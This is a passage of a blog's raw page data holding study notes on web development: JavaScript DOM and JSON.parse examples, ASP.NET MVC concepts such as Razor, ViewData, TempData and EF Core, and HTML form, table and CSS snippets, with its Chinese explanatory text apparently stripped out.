class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(el)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"2-document-createElement\"><a href=\"#2-document-createElement\" class=\"headerlink\" title=\"2.document.createElement\"></a>2.document.createElement</h5><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;list&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;item&quot;</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;item&quot;</span>&gt;</span>2<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;item&quot;</span>&gt;</span>3<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> list = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createElement</span>(<span class=\"string\">&#x27;ul&#x27;</span>) <span class=\"comment\">//1ul</span></span><br><span class=\"line\">list.<span class=\"property\">id</span> = <span class=\"string\">&#x27;list&#x27;</span> <span class=\"comment\">// id</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> ( <span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">3</span>; i++ ) &#123;</span><br><span class=\"line\"><span class=\"keyword\">let</span> item = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createElement</span>(<span class=\"string\">&#x27;li&#x27;</span>) <span class=\"comment\">//3li</span></span><br><span class=\"line\">item.<span class=\"property\">className</span> = <span class=\"string\">&#x27;item&#x27;</span> <span class=\"comment\">// class</span></span><br><span class=\"line\">item.<span class=\"property\">innerText</span> = <span class=\"string\">`<span class=\"subst\">$&#123;i + <span class=\"number\">1</span>&#125;</span>`</span> <span class=\"comment\">// innerText ()</span></span><br><span class=\"line\">list.<span class=\"title function_\">appendChild</span>(item) <span class=\"comment\">// </span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// listbody</span></span><br><span class=\"line\"><span class=\"variable language_\">document</span>.<span class=\"property\">body</span>.<span class=\"title function_\">appendChild</span>(list)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"JSON\"><a href=\"#JSON\" class=\"headerlink\" title=\"JSON\"></a>JSON</h4><ul>\n<li><strong><u></u></strong></li>\n<li><strong><u></u></strong></li>\n<li><strong><u></u></strong></li>\n<li><strong><u></u></strong></li>\n</ul>\n<p><strong>JSONJavaScriptJSON     null</strong></p>\n<p><strong>jsonDate</strong></p>\n<h4 id=\"JSON-parse\"><a href=\"#JSON-parse\" class=\"headerlink\" title=\"JSON.parse\"></a>JSON.parse</h4><p><strong> JSON.parse(text [, reviver]) JSONJavaScript</strong></p>\n<p><strong> </strong></p>\n<ul>\n<li><code>text</code>JSON ()</li>\n<li><code>reviver</code> </li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> jstr = <span class=\"string\">&#x27;&#123;&quot;name&quot;:&quot;wust&quot;, &quot;url&quot;:&quot;www.wust.edu.cn&quot;,&quot;birthday&quot;:&quot;1898-11-21&quot;&#125;&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> obj = <span class=\"title class_\">JSON</span>.<span class=\"title function_\">parse</span>( jstr, <span class=\"keyword\">function</span>(<span class=\"params\">key, value</span>) &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (key == <span class=\"string\">&quot;birthday&quot;</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">let</span> diff = <span class=\"keyword\">new</span> <span class=\"title class_\">Date</span>() - <span class=\"keyword\">new</span> <span class=\"title class_\">Date</span>(value); <span class=\"comment\">//</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">let</span> year = <span class=\"built_in\">parseInt</span>(diff / <span class=\"number\">1000</span> / <span class=\"number\">60</span> / <span class=\"number\">60</span> / <span class=\"number\">24</span> / <span class=\"number\">365</span>); <span class=\"comment\">//</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> year;</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(jsonObj.<span class=\"property\">birthday</span>);</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"-MVC\"><a href=\"#-MVC\" class=\"headerlink\" title=\".MVC\"></a>.MVC</h1><h4 id=\"1-MVC\"><a href=\"#1-MVC\" class=\"headerlink\" title=\"1.MVC\"></a>1.MVC</h4><ul>\n<li>MVC:3**<u>ModelViewController</u>**</li>\n<li>MVC</li>\n<li><strong></strong> <strong></strong> <strong>UI</strong></li>\n</ul>\n<h4 id=\"2-MVC\"><a href=\"#2-MVC\" class=\"headerlink\" title=\"2.MVC\"></a>2.MVC</h4><ul>\n<li>C</li>\n<li>M</li>\n<li>V</li>\n</ul>\n<h4 id=\"3-MVC\"><a href=\"#3-MVC\" class=\"headerlink\" title=\"3.MVC\"></a>3.MVC</h4><p> ControllerView()</p>\n<p> Model</p>\n<p> Model</p>\n<p> </p>\n<p> </p>\n<p> URLURL</p>\n<p> </p>\n<h4 id=\"4-MVC\"><a href=\"#4-MVC\" class=\"headerlink\" title=\"4.MVC\"></a>4.MVC</h4><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151451438.png\"\n                        alt=\"-1667485456621\"\n                 ></p>\n<h4 id=\"5-Razor\"><a href=\"#5-Razor\" class=\"headerlink\" title=\"5.Razor\"></a>5.Razor</h4><p><code>Razor</code>RazorC#HTML</p>\n<p><code>Razor</code></p>\n<p> C#  @{  } </p>\n<p> </p>\n<p>  @ </p>\n<p> C# </p>\n<h4 id=\"6-ViewData\"><a href=\"#6-ViewData\" class=\"headerlink\" title=\"6.ViewData\"></a>6.ViewData</h4><ul>\n<li>ViewDataControllerView</li>\n<li>ViewDataView</li>\n<li>()ViewDatanull</li>\n<li>ViewData</li>\n</ul>\n<h4 id=\"7-TrmpData\"><a href=\"#7-TrmpData\" class=\"headerlink\" title=\"7.TrmpData\"></a>7.TrmpData</h4><ul>\n<li>TempDataSession</li>\n<li>TempDataAction(Redirection)</li>\n<li>TempData</li>\n<li>TempDataViewData</li>\n</ul>\n<h4 id=\"8-\"><a href=\"#8-\" class=\"headerlink\" title=\"8.\"></a>8.</h4><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151451623.png\"\n                        alt=\"-1667485469907\"\n                 ></p>\n<h4 id=\"9-EF-Core\"><a href=\"#9-EF-Core\" class=\"headerlink\" title=\"9.EF Core\"></a>9.EF Core</h4><p> <strong><u>Add-Migration InitialCreate</u></strong></p>\n<p> <strong><u>Uppate-Database</u></strong></p>\n<h4 id=\"10-ORM\"><a href=\"#10-ORM\" class=\"headerlink\" title=\"10.ORM\"></a>10.ORM</h4><blockquote>\n<p>ORM (Object Relation Mapping) &#x2F;</p>\n</blockquote>\n<h4 id=\"11-ORM\"><a href=\"#11-ORM\" class=\"headerlink\" title=\"11.ORM\"></a>11.ORM</h4><p> </p>\n<p> </p>\n<p> ()</p>\n<p>() </p>\n<p>  </p>\n<h4 id=\"12-DateType\"><a href=\"#12-DateType\" class=\"headerlink\" title=\"12.DateType\"></a>12.DateType</h4><table>\n<thead>\n<tr>\n<th align=\"center\">DataType</th>\n<th align=\"center\"></th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">DataType.Currency</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">DataType.Date</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">DataType.EmailAddress</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">DataType.Multiline Text</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">DataType.Password</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">DataType.Time</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">DataType.Url</td>\n<td align=\"center\">URL</td>\n</tr>\n</tbody></table>\n<h4 id=\"13-\"><a href=\"#13-\" class=\"headerlink\" title=\"13.\"></a>13.</h4><p> <code>[Required]</code> null</p>\n<p> <code>[StringLength]</code></p>\n<p> <code>[Range]</code></p>\n<p> <code>[Compare]</code></p>\n<p> <code>[RegularExpression]</code> </p>\n<p> <code>[EmailAddress]</code></p>\n<p><code>[DataType]</code></p>\n<h4 id=\"14-\"><a href=\"#14-\" class=\"headerlink\" title=\"14.\"></a>14.</h4><p> <code>[HttpPost] </code>POSTAction[HttpGet] (CreateGET)</p>\n<p> <code>[ValidateAntiForgeryToken] </code> ()</p>\n<h4 id=\"15-\"><a href=\"#15-\" class=\"headerlink\" title=\"15.\"></a>15.</h4><p> ViewData ()</p>\n<p> </p>\n<p> </p>\n<pre><code>      return View(); \n\n      @model \n\n     ModelModel\n</code></pre>\n<h4 id=\"16-\"><a href=\"#16-\" class=\"headerlink\" title=\"16.\"></a>16.</h4><p> id </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class MoviesController : Controller</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">private readonly MvcMovieContext _context;</span><br><span class=\"line\">public MoviesController(MvcMovieContext context)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">_context = context;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// CRUD</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"NET\"><a href=\"#NET\" class=\"headerlink\" title=\"NET\"></a>NET</h1><h1 id=\"-\"><a href=\"#-\" class=\"headerlink\" title=\".\"></a>.</h1><h2 id=\"1-VScode-\"><a href=\"#1-VScode-\" class=\"headerlink\" title=\"1.VScode \"></a>1.VScode </h2><ul>\n<li><code>Live Server</code> <strong></strong></li>\n<li><code>Open-In-Browser</code><strong></strong></li>\n<li><code>HTML CSS Support</code><strong>HTMLCSS</strong></li>\n<li><code>CSS Peak</code><strong>CSSid</strong></li>\n<li><code>Prettier-Code formatter</code><strong></strong></li>\n<li><code>JavaScriptES6)CODE SNIPPETS</code><strong>ES6JavaScript</strong></li>\n<li><code>Color Info</code><strong>CSS</strong></li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h2 id=\"2-HTML\"><a href=\"#2-HTML\" class=\"headerlink\" title=\"2.HTML\"></a>2.HTML</h2><h4 id=\"html\"><a href=\"#html\" class=\"headerlink\" title=\"html\"></a>html</h4><table>\n<thead>\n<tr>\n<th align=\"center\"></th>\n<th align=\"center\">&amp;nbsp</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"></td>\n<td align=\"center\">&amp;nbsp</td>\n</tr>\n<tr>\n<td align=\"center\">&lt;</td>\n<td align=\"center\">&amp;lt</td>\n</tr>\n<tr>\n<td align=\"center\">&gt;</td>\n<td align=\"center\">&amp;gt</td>\n</tr>\n<tr>\n<td align=\"center\">&amp;</td>\n<td align=\"center\">&amp;amp</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">&amp;pound</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">&amp;yen</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">&amp;copy</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">&amp;reg</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">&amp;trade</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">&amp;times</td>\n</tr>\n</tbody></table>\n<h4 id=\"html\"><a href=\"#html\" class=\"headerlink\" title=\"html\"></a>html</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">table</span> <span class=\"attr\">border</span>=<span class=\"string\">&quot;1&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;600px&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">caption</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">caption</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">th</span> <span class=\"attr\">colspan</span>=<span class=\"string\">&quot;2&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>2021001<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">table</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>tr</code><code>th</code><code>td</code>()</li>\n<li><code>colspan=3</code>3</li>\n<li><code>rowspan=4</code>4</li>\n</ul>\n<h4 id=\"form\"><a href=\"#form\" class=\"headerlink\" title=\"form\"></a>form</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;data.html&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;get&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;nusername&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">        &lt;<span class=\"attr\">br</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;password&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;pwd&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;&quot;</span>&lt;<span class=\"attr\">br</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;reset&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"attr\">form</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>http://127.0.0.1:5500/data.html?nusername=123&amp;pwd=456</code>data.html**<u>&amp;</u>**</li>\n<li><code>action=xxxx.xxxx</code><strong>xxxx.xxxx</strong></li>\n<li><code>methon=&#39;get&#39;</code><code>get</code><code>post</code></li>\n</ul>\n<h4 id=\"form\"><a href=\"#form\" class=\"headerlink\" title=\"form\"></a>form</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;username&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;liulei&quot;</span> <span class=\"attr\">title</span>=<span class=\"string\">&quot;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">        &lt;<span class=\"attr\">br</span>/&gt;</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;password&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;pwd&quot;</span> <span class=\"attr\">maxlength</span>=<span class=\"string\">&quot;8&quot;</span> <span class=\"attr\">placeholder</span>=<span class=\"string\">&quot;8&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"attr\">form</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>name=&quot;username&quot;</code>url<strong>username</strong></li>\n<li><code>value=liulei</code> <code></code></li>\n<li><code>title=</code>**<u></u>**</li>\n<li><code>maxlength=8</code>8</li>\n<li><code>placeholder=&quot;8&quot;</code>**<u>8</u>**</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">br</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">select</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;master&quot;</span> <span class=\"attr\">size</span>=<span class=\"string\">&quot;4&quot;</span> <span class=\"attr\">multiple</span>=<span class=\"string\">&quot;multiple&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;0&quot;</span>&gt;</span>.NET<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1&quot;</span>&gt;</span>J2EE<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;2&quot;</span>&gt;</span>Java<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;3&quot;</span>&gt;</span>Android<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;4&quot;</span>&gt;</span>C<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">select</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>size</code> </li>\n<li><code>multiple=&quot;multiple&quot;</code></li>\n<li><code>value</code><strong>JAVA</strong><strong>master&#x3D;2</strong></li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> &gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;file&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;myfile&quot;</span> <span class=\"attr\">accept</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151450148.png\"\n                        alt=\"\"\n                 ></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;date&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;mydate&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151450996.png\"\n                       \n                 ></p>\n<h2 id=\"3-css\"><a href=\"#3-css\" class=\"headerlink\" title=\"3.css\"></a>3.css</h2><h4 id=\"-CSS\"><a href=\"#-CSS\" class=\"headerlink\" title=\" CSS\"></a> CSS</h4><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151451939.png\"\n                        alt=\"-1667485429884\"\n                 ></p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><table>\n<thead>\n<tr>\n<th></th>\n<th>10000</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>style</td>\n<td>1000</td>\n</tr>\n<tr>\n<td>id</td>\n<td>100</td>\n</tr>\n<tr>\n<td></td>\n<td>10</td>\n</tr>\n<tr>\n<td></td>\n<td>1</td>\n</tr>\n<tr>\n<td></td>\n<td>0</td>\n</tr>\n</tbody></table>\n<p><strong></strong></p>\n<h4 id=\"CSS--2-\"><a href=\"#CSS--2-\" class=\"headerlink\" title=\"CSS  2 \"></a>CSS  2 </h4><h5 id=\"1-\"><a href=\"#1-\" class=\"headerlink\" title=\"1.\"></a>1.</h5><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">div</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>:lightgrey;</span><br><span class=\"line\">\t<span class=\"attribute\">width</span>:<span class=\"number\">130px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">border-left</span>:<span class=\"number\">20px</span> solid green <span class=\"comment\">/**/</span></span><br><span class=\"line\">\tborder-radius:<span class=\"number\">5px</span>;<span class=\"comment\">/**/</span></span><br><span class=\"line\">\t<span class=\"attribute\">padding</span>:<span class=\"number\">10px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin</span>:<span class=\"number\">30px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">div</span><span class=\"selector-pseudo\">:hover</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>:<span class=\"built_in\">rgb</span>(<span class=\"number\">151</span>,<span class=\"number\">248</span>,<span class=\"number\">39</span>);</span><br><span class=\"line\">\t<span class=\"attribute\">cursor</span>:pointer;</span><br><span class=\"line\">\t<span class=\"attribute\">box-shadow</span>:<span class=\"number\">3px</span> <span class=\"number\">3px</span> <span class=\"number\">5px</span> <span class=\"number\">1px</span> <span class=\"built_in\">rgba</span>(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0.2</span>);<span class=\"comment\">/**/</span></span><br><span class=\"line\">&#125;</span><br><span 